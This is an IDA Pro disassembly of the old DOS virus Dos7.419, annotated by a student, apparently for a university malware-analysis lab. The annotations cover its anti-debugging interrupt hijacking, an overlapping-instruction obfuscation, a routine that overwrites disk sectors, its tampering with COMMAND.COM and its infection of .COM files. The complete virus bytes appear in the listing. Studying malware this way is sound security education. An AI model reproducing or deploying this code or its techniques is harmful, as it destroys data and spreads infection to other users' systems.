seg000:0100                            ;
seg000:0100                            ; +-------------------------------------------------------------------------+
seg000:0100                            ; |      This file was generated by The Interactive Disassembler (IDA)      |
seg000:0100                            ; |           Copyright (c) 2019 Hex-Rays, <support@hex-rays.com>           |
seg000:0100                            ; |                      License info: 48-BABB-7E64-E2                      |
seg000:0100                            ; |                     Georgia Institute of Technology                     |
seg000:0100                            ; +-------------------------------------------------------------------------+
seg000:0100                            ;
seg000:0100                            ; Input SHA256 : 7E00694397CBB7B422CB2F3E39A34C7FB7554931A1A9A2CF9AE7B2BCF42296E3
seg000:0100                            ; Input MD5    : 0B4A318803AA1B9B6A0DCC55CEFCB7CE
seg000:0100                            ; Input CRC32  : 785762D7
seg000:0100
seg000:0100                            ; ---------------------------------------------------------------------------
seg000:0100                            ; File Name   : /nethome/dkuchhal3/gt-spring20-ece4894/lab_3/Virus.DOS.Dos7.419
seg000:0100                            ; Format      : Binary file
seg000:0100                            ; Base Address: 0000h Range: 0100h - 02C8h Loaded length: 01C8h
seg000:0100
seg000:0100                                            .686p
seg000:0100                                            .mmx
seg000:0100                                            .model flat
seg000:0100
seg000:0100                            ; ===========================================================================
seg000:0100
seg000:0100                            ; Segment type: Pure code
seg000:0100                            seg000          segment byte public 'CODE' use16
seg000:0100                                            assume cs:seg000
seg000:0100                                            ;org 100h
seg000:0100                                            assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing
seg000:0100 C7 06 07 01 52 01                          mov     word ptr ds:loc_106+1, 152h ; Since the processor chaches/prefetches at least the first 5 instructions, this line is not gonna affect anything when ran on DOS (it will still change it in memory but DOS won't execute it). However, in the debugger the value of the offset will be modified to 152 from 186.
seg000:0106
seg000:0106                            loc_106:                                ; DATA XREF: seg000:0100↑w
seg000:0106 B8 52 01                                   mov     ax, 152h        ; Loads either 152 (debug) or 168 into the ax
seg000:0109 A3 2E 01                                   mov     word ptr ds:loc_129+5, ax ; 152 (debug mode) or 168 into the offset of loc_129 which will be used by int0 later.
seg000:010C 2B C0                                      sub     ax, ax          ; ax = 0
seg000:010E 1E                                         push    ds
seg000:010F 8E D8                                      mov     ds, ax          ; ds = 0
seg000:0111 8E C0                                      mov     es, ax          ; es = 0
seg000:0113 BE 84 00                                   mov     si, 84h         ; si = offset of int21
seg000:0116 BF 0C 00                                   mov     di, 0Ch         ; di = offset of int3
seg000:0119 A5                                         movsw
seg000:011A A5                                         movsw                   ; With these 2 movs it moves offset and segment of int21 into int3. Int3 = int21 now.
seg000:011B 26 A1 00 00                                mov     ax, es:0        ; offset of int0h into ax
seg000:011F A3 70 01                                   mov     word ptr ds:loc_16B+5, ax ; Stores the offset of the original into handler to restore it later
seg000:0122 26 A1 02 00                                mov     ax, es:2        ; segment of int0h into ax
seg000:0126 A3 77 01                                   mov     word ptr ds:loc_172+5, ax ; Stores the segment of the original into handler to restore it later
seg000:0129
seg000:0129                            loc_129:                                ; DATA XREF: seg000:0109↑w
seg000:0129 26 C7 06 00 00 52 01                       mov     word ptr es:0, 152h ; Stores offset based on debug vs no debug(168) into the offset of int0, this is where the jump of the int0 will be performed.
seg000:0130 1F                                         pop     ds
seg000:0131 8C D8                                      mov     ax, ds          ; ax = ds
seg000:0133 80 C4 10                                   add     ah, 10h         ; ax = 1000
seg000:0136 26 A3 02 00                                mov     es:2, ax        ; Sets the segment to a new value 64kb larger than the current one .
seg000:013A 8E C0                                      mov     es, ax
seg000:013C                                            assume es:nothing
seg000:013C BF 00 01                                   mov     di, 100h        ; DS:(E)SI to address ES:(E)DI. 100h offset for the destination segment
seg000:013F 8B F7                                      mov     si, di          ; Beg of the virus (current) file
seg000:0141 B9 A3 01                                   mov     cx, 1A3h        ; Copies 419 bytes (size of virus)
seg000:0144 F3 A4                                      rep movsb               ; Copies virus to the new segment
seg000:0146 8E D8                                      mov     ds, ax
seg000:0148                                            assume ds:nothing
seg000:0148 F7 F1                                      div     cx              ; Unsigned divide DX:AX by r/m16, with result stored in AX = Quotient, DX = Remainder. Here int0 is invoked and it jumps either to offset 152 with debugger or 168.
seg000:014A
seg000:014A                            CloseFile:                              ; CODE XREF: seg000:01AB↓j
seg000:014A B4 3E                                      mov     ah, 3Eh ; '>'   ; Closes file (ah = 3E)
seg000:014C CC                                         int     3               ; Trap to Debugger
seg000:014D
seg000:014D                            NextFile:                               ; CODE XREF: seg000:0195↓j
seg000:014D                                                                    ; seg000:01A5↓j
seg000:014D B4 4F                                      mov     ah, 4Fh ; 'O'   ; 4F = next file
seg000:014F CC                                         int     3               ; Trap to Debugger
seg000:0150 EB 3A                                      jmp     short loc_18C
seg000:0152                            ; ---------------------------------------------------------------------------
seg000:0152 2B C9                                      sub     cx, cx          ; cx = 0
seg000:0154
seg000:0154                            OverWrite:                              ; CODE XREF: seg000:0166↓j
seg000:0154 41                                         inc     cx              ; cx++
seg000:0155 0E                                         push    cs              ; cs biggining of this part of the code
seg000:0156 07                                         pop     es              ; es = cs
seg000:0157                                            assume es:nothing
seg000:0157
seg000:0157                            loc_157:                                ; CODE XREF: seg000:015A↓j
seg000:0157 B8 05 FE                                   mov     ax, 0FE05h      ; ax = FE05 is not used. Executes actually 05 FE EB FC because of the jump into second bit from next instruction. So it adds 0xebfe to ax.
seg000:015A EB FC                                      jmp     short near ptr loc_157+1 ; Jumps into second byte of loc_157 so ax is changed secretly.
seg000:015A                                                                    ;
seg000:015A                                                                    ; (05 FE EB) -> add ax, 0xebfe.
seg000:015A                                                                    ; Just beautiful!
seg000:015C                            ; ---------------------------------------------------------------------------
seg000:015C 2D 02 E7                                   sub     ax, 0E702h      ; ax = 0301h. which specifies write to disk and do it for al = 1 sector.
seg000:015F B7 01                                      mov     bh, 1           ; es = 0, bx = 100. Beg of the com file
seg000:0161 BA 00 00                                   mov     dx, 0           ; dl = 0 (drive A)
seg000:0164 CD 13                                      int     13h             ; DISK - SWBIOS - GET EXTENDED CYLINDER COUNT
seg000:0164                                                                    ; DL = drive number (80h, 81h)
seg000:0166 EB EC                                      jmp     short OverWrite ; Keep on overwriting sectors
seg000:0168                            ; ---------------------------------------------------------------------------
seg000:0168 06                                         push    es
seg000:0169 51                                         push    cx
seg000:016A 07                                         pop     es              ; es = cx
seg000:016B
seg000:016B                            loc_16B:                                ; DATA XREF: seg000:011F↑w
seg000:016B 26 C7 06 00 00 4C 4D                       mov     word ptr es:0, 4D4Ch ; patched 4D4Ch to offset of int 0 handler
seg000:0172
seg000:0172                            loc_172:                                ; DATA XREF: seg000:0126↑w
seg000:0172 26 C7 06 02 00 41 53                       mov     word ptr es:2, 5341h ; patched 5341h to segment of int 0 handler
seg000:0179 07                                         pop     es
seg000:017A C7 06 07 01 68 01                          mov     word ptr ds:107h, 168h ; Restores the original offset that doesn't perform the jump to overwriting hard drive (because even though we executed the prefetched instructions the offset is still overwritten in the memory)
seg000:0180 B4 1A                                      mov     ah, 1Ah         ; Sets DTA
seg000:0182 99                                         cwd                     ; (convert word to doubleword) instruction extends the sign bit of AX into the DX register
seg000:0183 CC                                         int     3               ; Trap to Debugger
seg000:0184 B4 4E                                      mov     ah, 4Eh ; 'N'   ; 4E = open file
seg000:0186 2B C9                                      sub     cx, cx          ; cx =0
seg000:0188 BA 23 02                                   mov     dx, 223h        ; Reference to WildCard file description
seg000:018B CC                                         int     3               ; Trap to Debugger
seg000:018C
seg000:018C                            loc_18C:                                ; CODE XREF: seg000:0150↑j
seg000:018C 72 7E                                      jb      short End       ; If error (no file found) with int 21 jump to end
seg000:018E B8 02 3D                                   mov     ax, 3D02h       ; Open file for read and write access
seg000:0191 BA 1E 00                                   mov     dx, 1Eh         ; Fileneame to open at offset 1E in DTA
seg000:0194 CC                                         int     3               ; Trap to Debugger
seg000:0195 72 B6                                      jb      short NextFile  ; If error, move on to the next file (4F is next file)
seg000:0197 8B D8                                      mov     bx, ax
seg000:0199 B4 3F                                      mov     ah, 3Fh ; '?'   ; int 21 -> 3F = read from file
seg000:019B BF 1A 00                                   mov     di, 1Ah         ; Copying the address of the size of the file into di
seg000:019E 8B 0D                                      mov     cx, [di]        ; Copying size of the file into cx
seg000:01A0 8B D6                                      mov     dx, si          ; dx = 100h. ds:dx is buffer for read
seg000:01A2 CC                                         int     3               ; Trap to Debugger
seg000:01A3 8B 04                                      mov     ax, [si]        ; Gets the first word of the new .com file
seg000:01A5 72 A6                                      jb      short NextFile  ; next if error
seg000:01A7 3B 06 00 01                                cmp     ax, ds:100h     ; Compares to itself to see if the file is infected already
seg000:01AB 74 9D                                      jz      short CloseFile ; 3E -> close the file for int21 (if it's already infected)
seg000:01AD 8B 44 02                                   mov     ax, [si+2]      ; If not infected, grabs seconds word to see if the file is the Command.com file
seg000:01B0 3D 15 60                                   cmp     ax, 6015h       ; Checks against COMMAND.COM second word I think
seg000:01B3 74 02                                      jz      short CopyingHappens ; If equal, edit COMMAND.COM
seg000:01B5 EB 3F                                      jmp     short Infect    ; Else, infect as a normal file
seg000:01B7                            ; ---------------------------------------------------------------------------
seg000:01B7
seg000:01B7                            CopyingHappens:                         ; CODE XREF: seg000:01B3↑j
seg000:01B7 57                                         push    di
seg000:01B8 56                                         push    si
seg000:01B9 BE 4D 02                                   mov     si, 24Dh
seg000:01BC BF F0 23                                   mov     di, 23F0h       ; Edits DOS's copyright notice at this offset ()
seg000:01BF B9 55 00                                   mov     cx, 55h ; 'U'
seg000:01C2 90                                         nop
seg000:01C3 FC                                         cld
seg000:01C4 F3 A4                                      rep movsb               ; Writes string stored at offset 24D to DOS's copyright offset.
seg000:01C6 BE 2A 02                                   mov     si, 22Ah
seg000:01C9 BF 57 90                                   mov     di, 9057h       ; "Disk in drive ..." at that offset in COMMAND.com
seg000:01CC B9 0C 00                                   mov     cx, 0Ch
seg000:01CF 90                                         nop
seg000:01D0 F3 A4                                      rep movsb               ; Writes string stored at offset 22A to COMMAND.COM. It's the 'infected' comment.
seg000:01D2 BE 36 02                                   mov     si, 236h
seg000:01D5 BF 4C 91                                   mov     di, 914Ch       ; Bad command.... at that offset in COMMAND>COM
seg000:01D8 B9 17 00                                   mov     cx, 17h
seg000:01DB 90                                         nop
seg000:01DC F3 A4                                      rep movsb               ; Writes string stored at offset 236 to COMMAND.COM. It's the mean comment.
seg000:01DE B8 00 42                                   mov     ax, 4200h       ; Go to the start of file
seg000:01E1 2B D2                                      sub     dx, dx          ; dx =0
seg000:01E3 8B CA                                      mov     cx, dx
seg000:01E5 CC                                         int     3               ; Trap to Debugger
seg000:01E6 B4 40                                      mov     ah, 40h ; '@'   ; Writing the new COMMAND.COM back
seg000:01E8 BA A3 02                                   mov     dx, 2A3h        ; Location of transient part of COMMAND,com in memory, that's where it will write
seg000:01EB B9 BD CE                                   mov     cx, 0CEBDh      ; size of COMMAND.COM
seg000:01EE CC                                         int     3               ; Trap to Debugger
seg000:01EF B4 3E                                      mov     ah, 3Eh ; '>'   ; 3e = close COMMAND.COM
seg000:01F1 CC                                         int     3               ; Trap to Debugger
seg000:01F2 5E                                         pop     si              ; Restore
seg000:01F3 5F                                         pop     di
seg000:01F4 EB 16                                      jmp     short End
seg000:01F6                            ; ---------------------------------------------------------------------------
seg000:01F6
seg000:01F6                            Infect:                                 ; CODE XREF: seg000:01B5↑j
seg000:01F6 B8 00 42                                   mov     ax, 4200h       ; Go to the start of the file
seg000:01F9 2B D2                                      sub     dx, dx
seg000:01FB 8B CA                                      mov     cx, dx
seg000:01FD CC                                         int     3               ; Trap to Debugger
seg000:01FE FE C6                                      inc     dh              ; dx = 100h, right after PSP
seg000:0200 B4 40                                      mov     ah, 40h ; '@'   ; Write to file
seg000:0202 8B 0D                                      mov     cx, [di]        ; di = 1A, so cx = size of the file (from DTA)
seg000:0204 81 C1 A3 01                                add     cx, 1A3h        ; Adds the size of the virus (419) to cx as it specifiys the # of bytes to write
seg000:0208 CC                                         int     3               ; Trap to Debugger
seg000:0209 B4 3E                                      mov     ah, 3Eh ; '>'   ; Close file
seg000:020B CC                                         int     3               ; Trap to Debugger
seg000:020C
seg000:020C                            End:                                    ; CODE XREF: seg000:loc_18C↑j
seg000:020C                                                                    ; seg000:01F4↑j
seg000:020C 8C D0                                      mov     ax, ss          ; Restoring ES and DS
seg000:020E 8E C0                                      mov     es, ax
seg000:0210 8E D8                                      mov     ds, ax
seg000:0212                                            assume ds:nothing
seg000:0212 50                                         push    ax
seg000:0213 B4 1A                                      mov     ah, 1Ah
seg000:0215 D1 EA                                      shr     dx, 1           ; Restore DTA
seg000:0217 CC                                         int     3               ; Trap to Debugger
seg000:0218 BF 00 01                                   mov     di, 100h        ; Put .com start point onto stack
seg000:021B 57                                         push    di
seg000:021C 8B CC                                      mov     cx, sp
seg000:021E 2B CE                                      sub     cx, si
seg000:0220 F3 A4                                      rep movsb
seg000:0222 CB                                         retf
seg000:0222                            ; ---------------------------------------------------------------------------
seg000:0223 2A                                         db  2Ah ; *
seg000:0224 57                                         db  57h ; W
seg000:0225 2E 43 3F 4D 00             aCM             db '.C?M',0
seg000:022A 69                                         db  69h ; i
seg000:022B 73                                         db  73h ; s
seg000:022C 20 69                                      dw 6920h
seg000:022E 6E                                         db  6Eh ; n
seg000:022F 66                                         db  66h ; f
seg000:0230 65                                         db  65h ; e
seg000:0231 63                                         db  63h ; c
seg000:0232 74                                         db  74h ; t
seg000:0233 65                                         db  65h ; e
seg000:0234 64                                         db  64h ; d
seg000:0235 21                                         db  21h ; !
seg000:0236 6F                                         db  6Fh ; o
seg000:0237 79                                         db  79h ; y
seg000:0238 2C                                         db  2Ch ; ,
seg000:0239 20                                         db  20h
seg000:023A 61                                         db  61h ; a
seg000:023B 72                                         db  72h ; r
seg000:023C 65                                         db  65h ; e
seg000:023D 20                                         db  20h
seg000:023E 79                                         db  79h ; y
seg000:023F 6F                                         db  6Fh ; o
seg000:0240 75                                         db  75h ; u
seg000:0241 20                                         db  20h
seg000:0242 65                                         db  65h ; e
seg000:0243 76                                         db  76h ; v
seg000:0244 65                                         db  65h ; e
seg000:0245 72                                         db  72h ; r
seg000:0246 20                                         db  20h
seg000:0247 64                                         db  64h ; d
seg000:0248 75                                         db  75h ; u
seg000:0249 6D                                         db  6Dh ; m
seg000:024A 62                                         db  62h ; b
seg000:024B 21                                         db  21h ; !
seg000:024C 20                                         db  20h
seg000:024D 4D                                         db  4Dh ; M
seg000:024E 53                                         db  53h ; S
seg000:024F 44                                         db  44h ; D
seg000:0250 4F                                         db  4Fh ; O
seg000:0251 53                                         db  53h ; S
seg000:0252 20                                         db  20h
seg000:0253 37                                         db  37h ; 7
seg000:0254 20                                         db  20h
seg000:0255 28                                         db  28h ; (
seg000:0256 43                                         db  43h ; C
seg000:0257 29                                         db  29h ; )
seg000:0258 31                                         db  31h ; 1
seg000:0259 39                                         db  39h ; 9
seg000:025A 39                                         db  39h ; 9
seg000:025B 33                                         db  33h ; 3
seg000:025C 20                                         db  20h
seg000:025D 41                                         db  41h ; A
seg000:025E 4E                                         db  4Eh ; N
seg000:025F 41                                         db  41h ; A
seg000:0260 52                                         db  52h ; R
seg000:0261 4B                                         db  4Bh ; K
seg000:0262 49                                         db  49h ; I
seg000:0263 43                                         db  43h ; C
seg000:0264 4B                                         db  4Bh ; K
seg000:0265 20                                         db  20h
seg000:0266 53                                         db  53h ; S
seg000:0267 59                                         db  59h ; Y
seg000:0268 53                                         db  53h ; S
seg000:0269 54                                         db  54h ; T
seg000:026A 45                                         db  45h ; E
seg000:026B 4D                                         db  4Dh ; M
seg000:026C 53                                         db  53h ; S
seg000:026D 0D                                         db  0Dh
seg000:026E 0A                                         db  0Ah
seg000:026F 01                                         db    1
seg000:0270 01                                         db    1
seg000:0271 01                                         db    1
seg000:0272 20                                         db  20h
seg000:0273 20                                         db  20h
seg000:0274 20                                         db  20h
seg000:0275 20                                         db  20h
seg000:0276 20                                         db  20h
seg000:0277 44                                         db  44h ; D
seg000:0278 4F                                         db  4Fh ; O
seg000:0279 53                                         db  53h ; S
seg000:027A 20                                         db  20h
seg000:027B 36                                         db  36h ; 6
seg000:027C 20                                         db  20h
seg000:027D 41                                         db  41h ; A
seg000:027E 6E                                         db  6Eh ; n
seg000:027F 74                                         db  74h ; t
seg000:0280 69                                         db  69h ; i
seg000:0281 76                                         db  76h ; v
seg000:0282 69                                         db  69h ; i
seg000:0283 72                                         db  72h ; r
seg000:0284 75                                         db  75h ; u
seg000:0285 73                                         db  73h ; s
seg000:0286 20                                         db  20h
seg000:0287 73                                         db  73h ; s
seg000:0288 75                                         db  75h ; u
seg000:0289 63                                         db  63h ; c
seg000:028A 6B                                         db  6Bh ; k
seg000:028B 73                                         db  73h ; s
seg000:028C 2E                                         db  2Eh ; .
seg000:028D 20                                         db  20h
seg000:028E 49                                         db  49h ; I
seg000:028F 74                                         db  74h ; t
seg000:0290 20                                         db  20h
seg000:0291 6D                                         db  6Dh ; m
seg000:0292 69                                         db  69h ; i
seg000:0293 73                                         db  73h ; s
seg000:0294 73                                         db  73h ; s
seg000:0295 65                                         db  65h ; e
seg000:0296 64                                         db  64h ; d
seg000:0297 20                                         db  20h
seg000:0298 74                                         db  74h ; t
seg000:0299 68                                         db  68h ; h
seg000:029A 69                                         db  69h ; i
seg000:029B 73                                         db  73h ; s
seg000:029C 20                                         db  20h
seg000:029D 6F                                         db  6Fh ; o
seg000:029E 6E                                         db  6Eh ; n
seg000:029F 65                                         db  65h ; e
seg000:02A0 21                                         db  21h ; !
seg000:02A1 20                                         db  20h
seg000:02A2 24                                         db  24h ; $
seg000:02A3                            ; ---------------------------------------------------------------------------
seg000:02A3 B4 09                                      mov     ah, 9           ; Stdout restore
seg000:02A5 BA 09 01                                   mov     dx, 109h
seg000:02A8 CC                                         int     3               ; Trap to Debugger
seg000:02A9 B4 4C                                      mov     ah, 4Ch ; 'L'   ; terminates process and goes back to command line
seg000:02AB CC                                         int     3               ; Trap to Debugger
seg000:02AB                            ; ---------------------------------------------------------------------------
seg000:02AC 5B                                         db  5Bh ; [
seg000:02AD 44                                         db  44h ; D
seg000:02AE 4F                                         db  4Fh ; O
seg000:02AF 53                                         db  53h ; S
seg000:02B0 20                                         db  20h
seg000:02B1 37                                         db  37h ; 7
seg000:02B2 76                                         db  76h ; v
seg000:02B3 01                                         db    1
seg000:02B4 01                                         db    1
seg000:02B5 01                                         db    1
seg000:02B6 5D                                         db  5Dh ; ]
seg000:02B7 20                                         db  20h
seg000:02B8 4C                                         db  4Ch ; L
seg000:02B9 75                                         db  75h ; u
seg000:02BA 63                                         db  63h ; c
seg000:02BB 69                                         db  69h ; i
seg000:02BC 66                                         db  66h ; f
seg000:02BD 65                                         db  65h ; e
seg000:02BE 72                                         db  72h ; r
seg000:02BF 20                                         db  20h
seg000:02C0 4D                                         db  4Dh ; M
seg000:02C1 65                                         db  65h ; e
seg000:02C2 73                                         db  73h ; s
seg000:02C3 73                                         db  73h ; s
seg000:02C4 69                                         db  69h ; i
seg000:02C5 61                                         db  61h ; a
seg000:02C6 68                                         db  68h ; h
seg000:02C7 24                                         db  24h ; $
seg000:02C7                            seg000          ends
seg000:02C7
seg000:02C7
seg000:02C7                                            end
